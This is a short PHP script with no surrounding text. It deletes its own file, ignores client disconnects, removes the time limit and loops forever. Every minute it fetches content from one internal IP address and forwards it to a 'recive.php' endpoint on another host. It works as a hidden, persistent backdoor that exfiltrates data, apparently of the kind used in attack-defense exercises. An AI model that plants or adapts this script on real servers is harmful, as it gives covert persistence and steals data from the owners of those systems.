<?php
unlink($_SERVER['SCRIPT_FILENAME']);
ignore_user_abort(true);
set_time_limit(0);
while (true) {
    $x = file_get_contents('http://192.168.8.128');
	file_get_contents('http://192.168.8.109/recive.php?a='.$x);
    sleep(60);
}
?>
